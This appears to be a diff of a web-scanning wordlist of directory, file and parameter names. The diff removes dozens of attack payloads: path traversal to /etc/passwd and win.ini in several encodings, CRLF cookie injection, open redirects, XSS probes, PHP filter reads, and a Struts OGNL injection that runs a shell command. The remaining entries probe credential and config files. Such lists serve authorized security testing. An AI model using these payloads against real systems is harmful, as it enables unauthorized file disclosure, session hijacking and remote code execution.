@@ -7958,7 +7958,6 @@ gwmobile
 gulpfile.basics
 ftd
 eslint-plugin-imperative
-%5Cexample.com
 RedirectUrl
 uinfamilyareaId
 adminitems.aspx
@@ -11992,7 +11991,6 @@ browsersync
 test.aspx
 payfororder
 loanStatus
-?phpinfo=-1
 refpagelid
 datalynx
 resources/fckeditor
@@ -12779,7 +12777,6 @@ edet
 yr
 static/diff_worker.js
 Instagram.txt
-%0a/example.com/
 bitvise
 bestanddeel
 wp-content/.git/config
@@ -15411,7 +15408,6 @@ my.rar
 phpmyadmin-3.3.3-rc1
 listman
 threejs
-%0ASet-Cookie%3Acrlfinjection/..
 textcolor
 s123
 dada
@@ -17253,7 +17249,6 @@ mobiledeveloper
 virtualreality
 admin8cda7b28/login.php
 admincpacceso.php
-?a=display&templateFile=README.md
 familyshop
 myweblan
 webadmin
@@ -17349,7 +17344,6 @@ mysql5
 hcs
 services/minio/.env
 randomforest
-?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
 972
 edi
 Wallets.txt
@@ -18011,7 +18005,6 @@ url2
 var/log/authorizenet.log
 Uinroute
 adm
-?q=../../../etc/passwd&s=../../../etc/passwd&search=../../../etc/passwd&id=&action=../../../etc/passwd&keyword=../../../etc/passwd&query=../../../etc/passwd&page=../../../etc/passwd&keywords=../../../etc/passwd&url=../../../etc/passwd&view=../../../etc/passwd&cat=../../../etc/passwd&name=../../../etc/passwd&key=../../../etc/passwd&p=../../../etc/passwd
 clipIdurl
 GA
 juniper
@@ -19410,7 +19403,6 @@ interactive
 csvIDs
 wp-pass.php
 itoktitle
-?a=display&templateFile=../../../../../../../../../../../../../../../../windows/win.ini
 slate
 blogNameOriginBaseSKU
 LXD
@@ -22410,7 +22402,6 @@ nyheter
 staticmap
 phpMyAdmin-2.2.3/
 .svn/text-base/
-?Page=%0D%0ASet-Cookie:crlfinjection=crlfinjection&_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&callback=%0D%0ASet-Cookie:crlfinjection=crlfinjection&checkout_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&content=%0D%0ASet-Cookie:crlfinjection=crlfinjection&continue=%0D%0ASet-Cookie:crlfinjection=crlfinjection&continueTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection&counturl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&data=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dest=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dest_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dir=%0D%0ASet-Cookie:crlfinjection=crlfinjection&document=%0D%0ASet-Cookie:crlfinjection=crlfinjection&domain=%0D%0ASet-Cookie:crlfinjection=crlfinjection&done=%0D%0ASet-Cookie:crlfinjection=crlfinjection&download=%0D%0ASet-Cookie:crlfinjection=crlfinjection&feed=%0D%0ASet-Cookie:crlfinjection=crlfinjection&file=%0D%0ASet-Cookie:crlfinjection=crlfinjection&host=%0D%0ASet-Cookie:crlfinjection=crlfinjection&html=%0D%0ASet-Cookie:crlfinjection=crlfinjection&http=%0D%0ASet-Cookie:crlfinjection=crlfinjection&https=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image_src=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&imageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&include=%0D%0ASet-Cookie:crlfinjection=crlfinjection&media=%0D%0ASet-Cookie:crlfinjection=crlfinjection&navigation=%0D%0ASet-Cookie:crlfinjection=crlfinjection&next=%0D%0ASet-Cookie:crlfinjection=crlfinjection&open=%0D%0ASet-Cookie:crlfinjection=crlfinjection&out=%0D%0ASet-Cookie:crlfinjection=crlfinjection&page=%0D%0ASet-Cookie:crlfinjection=crlfinjection&page_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&pageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&path=%0D%0ASet-Cookie:crlfinjection=crlfinjection&picture=%0D%0ASet-Cookie:crlfinjection=crlfinjection&port=%0D%0ASet-Cookie:crlfinjection=crlfinjection&proxy=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redir=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirect=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirectUri&redirectUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&reference=%0D%0ASet-Cookie:crlfinjection=crlfinjection&referrer=%0D%0ASet-Cookie:crlfinjection=crlfinjection&req=%0D%0ASet-Cookie:crlfinjection=crlfinjection&request=%0D%0ASet-Cookie:crlfinjection=crlfinjection&retUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return=%0D%0ASet-Cookie:crlfinjection=crlfinjection&returnTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return_path=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection&rurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&show=%0D%0ASet-Cookie:crlfinjection=crlfinjection&site=%0D%0ASet-Cookie:crlfinjection=crlfinjection&source=%0D%0ASet-Cookie:crlfinjection=crlfinjection&src=%0D%0ASet-Cookie:crlfinjection=crlfinjection&target=%0D%0ASet-Cookie:crlfinjection=crlfinjection&to=%0D%0ASet-Cookie:crlfinjection=crlfinjection&uri=%0D%0ASet-Cookie:crlfinjection=crlfinjection&url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&val=%0D%0ASet-Cookie:crlfinjection=crlfinjection&validate=%0D%0ASet-Cookie:crlfinjection=crlfinjection&view=%0D%0ASet-Cookie:crlfinjection=crlfinjection&window=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirect_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection
 american
 four.txt
 hex
@@ -27799,7 +27790,6 @@ tconn.conf
 advantage
 timeout-then
 ows-bin/r.cgi
-?q=../../../etc/passwd%00&s=../../../etc/passwd%00&search=../../../etc/passwd%00&id=../../../etc/passwd%00&action=../../../etc/passwd%00&keyword=../../../etc/passwd%00&query=../../../etc/passwd%00&page=../../../etc/passwd%00&keywords=../../../etc/passwd%00&url=../../../etc/passwd%00&view=../../../etc/passwd%00&cat=../../../etc/passwd%00&name=../../../etc/passwd%00&key=../../../etc/passwd%00&p=../../../etc/passwd%00
 ComeUrl
 buildkite-agent.cfg
 cloudplatform
@@ -29917,7 +29907,6 @@ mediabox404
 gras
 admin_del.php
 reactcontext
-%0d/example.com/
 php_test
 wsconnector/config1
 kselftest_install.sh
@@ -30430,7 +30419,6 @@ wp-blog-header.php
 contextify
 client2.php
 admin_art.asp
-?q=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&s=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&search=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&id=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&action=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&keyword=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&query=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&keywords=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&url=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&view=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&cat=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&name=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&key=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&p=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 _debugbar
 updating
 admin-app/.env
@@ -35331,7 +35319,6 @@ talos
 pageNamereferrer
 brandgroup
 cove
-?a=display&templateFile=../../../../../../../../../../../../../../../../etc/passwd
 warned
 horoscop
 finals
@@ -36522,7 +36509,6 @@ ganglia/
 typeURL
 .pgsql.txt
 bxrandroute
-?q=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&s=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&search=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&id=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&action=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&keyword=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&query=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&keywords=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&url=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&view=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&cat=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&name=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&key=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&p=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 .rspec_parallel
 procedures
 olbs.sql
@@ -41930,7 +41916,6 @@ ouro
 apiconnect-cli-config
 lodash.keys
 weekend
-?q=views/ajax/autocomplete/user/a
 CMPdataid
 nn-no
 subjectdruh
@@ -43373,7 +43358,6 @@ tatsuya
 rpm-install.sh
 valentin
 631
-?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
 broccoli-source
 lonerunner
 cgi-home/a1disp3.cgi
@@ -43505,7 +43489,6 @@ jtest
 logon.html
 admin_handler.php
 number_format
-%3Cscript%3Ealert(document.domain)%3C/script%3E
 geodesy
 tecnico
 array-filter
@@ -47119,7 +47102,6 @@ zoneidlang
 goes
 server11
 allowMultiplePages
-%0ASet-Cookie:crlfinjection=crlfinjection
 extjs/
 bitcoin.log
 _webalizer
@@ -51236,7 +51218,6 @@ valuemodroute
 hotel_admin
 tests.mp4
 spain
-%5cgoogle.com/evil.html
 photo2
 messageAttachmentId
 minikube
@@ -51655,7 +51636,6 @@ floppy
 imagedashedline
 ave
 sam
-%5cexample.com/%2f%2e%2e
 .codeclimate.json
 pws.php
 dmitry
@@ -54625,7 +54605,6 @@ von
 fromPageId
 lodge
 archivedimages
-?page=example.com&_url=example.com&callback=example.com&checkout_url=example.com&content=example.com&continue=example.com&continueTo=example.com&counturl=example.com&data=example.com&dest=example.com&dest_url=example.com&dir=example.com&document=example.com&domain=example.com&done=example.com&download=example.com&feed=example.com&file=example.com&host=example.com&html=example.com&http=example.com&https=example.com&image=example.com&image_src=example.com&image_url=example.com&imageurl=example.com&include=example.com&langTo=example.com&media=example.com&navigation=example.com&next=example.com&open=example.com&out=example.com&page=example.com&page_url=example.com&pageurl=example.com&path=example.com&picture=example.com&port=example.com&proxy=example.com&redir=example.com&redirect=example.com&redirectUri=example.com&redirectUrl=example.com&reference=example.com&referrer=example.com&req=example.com&request=example.com&retUrl=example.com&return=example.com&returnTo=example.com&return_path=example.com&return_to=example.com&rurl=example.com&show=example.com&site=example.com&source=example.com&src=example.com&target=example.com&to=example.com&uri=example.com&url=example.com&val=example.com&validate=example.com&view=example.com&window=example.com&redirect_to=example.com
 Affiliation
 pidfamilyroute
 bbs/admin/login
@@ -57902,7 +57881,6 @@ ihm
 codingjourney
 link_to
 typeselectformurl
-?q=%252e%252e%252fetc%252fpasswd%00&s=%252e%252e%252fetc%252fpasswd%00&search=%252e%252e%252fetc%252fpasswd%00&id=%252e%252e%252fetc%252fpasswd%00&action=%252e%252e%252fetc%252fpasswd%00&keyword=%252e%252e%252fetc%252fpasswd%00&query=%252e%252e%252fetc%252fpasswd%00&page=%252e%252e%252fetc%252fpasswd%00&keywords=%252e%252e%252fetc%252fpasswd%00&url=%252e%252e%252fetc%252fpasswd%00&view=%252e%252e%252fetc%252fpasswd%00&cat=%252e%252e%252fetc%252fpasswd%00&name=%252e%252e%252fetc%252fpasswd%00&key=%252e%252e%252fetc%252fpasswd%00&p=%252e%252e%252fetc%252fpasswd%00
 dense
 json2xml
 pipeline.json
@@ -59000,7 +58978,6 @@ secfamilyroute
 _www
 app/config/packages/test/web_profiler.yaml
 crisoftricette
-?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 prid
 webclient/Login.xhtml
 fcmedianet.js
@@ -59253,7 +59230,6 @@ textinputs
 launcher.sh
 adm.php
 mcgallery
-?q=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&s=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&search=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&id=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&action=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&keyword=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&query=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&keywords=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&url=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&view=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&cat=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&name=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&key=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&p=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 arrival
 mugs
 temtel.php
@@ -59628,7 +59604,6 @@ dump.sql.tar.bz2
 dcc
 blogIDseason
 lolex
-?redirect=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 keychain
 advsearch
 default.json
@@ -61794,7 +61769,6 @@ admin_info
 require-reload
 wbb3
 zoneidfmt
-%0D%0ASet-Cookie:crlfinjection=crlfinjection
 unist-util-position
 feedbacks
 uupaa.minify.js
@@ -66110,7 +66084,6 @@ addfile
 foldmenu
 jenkins_build.sh
 aktionen
-?q=admin/views/ajax/autocomplete/user/a
 public/home/common/js/index.js
 passwords
 Key
@@ -67356,7 +67329,6 @@ connectt
 auth_config.json
 admanagement
 managebilling
-?pp=env
 phpwebdevelopment
 www3
 cockpit
@@ -70162,7 +70134,6 @@ logon/logon.html
 appc
 trackingextension
 config/packages/html_sanitizer.php
-%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection
 manage/
 phpMyAdmin-2.6.2
 cassie
@@ -72120,7 +72091,6 @@ identical
 wordpress.zip
 wechat.mp3
 gmtcl
-?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss1%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss2%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss3%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss4%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss5%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss6%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss7%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss8%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss9%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss10%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss11%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss12%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss13%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss14%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E
 codepipeline.yml
 jimages
 pageevent
@@ -75865,7 +75835,6 @@ inl
 querywordinstring
 ns52
 ssc/api/v1/bulk
-?mobile=1&mp_idx=%22;alert(%271%27);//
 NVKWDpromoid
 holidayseason
 qwerty
@@ -77618,7 +77587,6 @@ drop-tables-innodb.sql
 poc.php
 newsengine
 nginx_template.conf
-%00/example.com/
 accidentalcomplexity
 jscoverage
 sla
@@ -81352,7 +81320,6 @@ webpack-dev-server
 webcgi/netauth.cgi
 pagestory
 dlm
-?redirect=..%2f..%2f..%2f..%2fwindows/win.ini
 busybox
 messageorientedmiddleware
 surfer
@@ -82099,7 +82066,6 @@ fake-eggs
 malda
 admin_logs.php
 cjxy
-?q=%252e%252e%252fetc%252fpasswd&s=%252e%252e%252fetc%252fpasswd&search=%252e%252e%252fetc%252fpasswd&id=%252e%252e%252fetc%252fpasswd&action=%252e%252e%252fetc%252fpasswd&keyword=%252e%252e%252fetc%252fpasswd&query=%252e%252e%252fetc%252fpasswd&page=%252e%252e%252fetc%252fpasswd&keywords=%252e%252e%252fetc%252fpasswd&url=%252e%252e%252fetc%252fpasswd&view=%252e%252e%252fetc%252fpasswd&cat=%252e%252e%252fetc%252fpasswd&name=%252e%252e%252fetc%252fpasswd&key=%252e%252e%252fetc%252fpasswd&p=%252e%252e%252fetc%252fpasswd
 imagegallerymagento2
 ENV/
 blog_search
@@ -82778,7 +82744,6 @@ neighborhood
 networkanalysis
 browser
 phonenumber.txt
-%0DSet-Cookie:crlfinjection=crlfinjection
 cpuurl
 upfiles
 htdocs/.gitignore
@@ -89658,7 +89623,6 @@ httpinterceptor
 xlsjs
 anecdote
 imcservices
-%c0
 autoPlayurl
 livereload-server-spec
 cgi-perl/ttawebtop.cgi/
@@ -92680,7 +92644,6 @@ DRY
 phpjs
 api-docs/swagger.json
 egresados
-?q=..///////..////..//////etc/passwd&s=..///////..////..//////etc/passwd&search=..///////..////..//////etc/passwd&id=..///////..////..//////etc/passwd&action=..///////..////..//////etc/passwd&keyword=..///////..////..//////etc/passwd&query=..///////..////..//////etc/passwd&page=..///////..////..//////etc/passwd&keywords=..///////..////..//////etc/passwd&url=..///////..////..//////etc/passwd&view=..///////..////..//////etc/passwd&cat=..///////..////..//////etc/passwd&name=..///////..////..//////etc/passwd&key=..///////..////..//////etc/passwd&p=..///////..////..//////etc/passwd
 produkte
 propertyrfsn
 familydataType
@@ -93064,7 +93027,6 @@ langbianhao
 cgi-sys/auktion.cgi
 examples/websocket/index.xhtml
 在线exp专用免杀版.php
-%09/example.com/
 perlblog
 enb-borschik
 subscribe_ewsi
@@ -93219,7 +93181,6 @@ bdTopshowinfo
 unionfind
 4runner
 gameoff
-?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini
 .atfp_history
 borderwidthnoscript
 efsoftware
@@ -93603,7 +93564,6 @@ sftp.json
 logi
 law
 server/.npmrc
-?q=....//....//etc/passwd&s=....//....//etc/passwd&search=....//....//etc/passwd&id=....//....//etc/passwd&action=....//....//etc/passwd&keyword=....//....//etc/passwd&query=....//....//etc/passwd&page=....//....//etc/passwd&keywords=....//....//etc/passwd&url=....//....//etc/passwd&view=....//....//etc/passwd&cat=....//....//etc/passwd&name=....//....//etc/passwd&key=....//....//etc/passwd&p=....//....//etc/passwd
 infophp.php
 mic
 contentId
@@ -93628,7 +93588,6 @@ fastbench
 contactEmail
 good-file
 educationapplication
-?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D
 enabling
 some
 CRONS
@@ -101340,7 +101299,6 @@ cadmins
 labelappvermini
 plus/search.php
 querystring
-%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection
 freenas
 jspshell.jsp
 limes
@@ -102270,7 +102228,6 @@ Sub
 cb
 Performance
 continued
-?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 amazon.7z
 ~m-mat
 rt3
@@ -103926,7 +103883,6 @@ Operation
 macroscripts
 reconnect-net
 mongodb32
-?wsdl
 whois
 EmployeeSecretQuestion
 tournamentIdroute
@@ -104872,7 +104828,6 @@ filezilla.xml
 blackfriday
 srss
 controlpanel/
-%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e
 msidsubmitbackurl
 _Template
 sumidaku
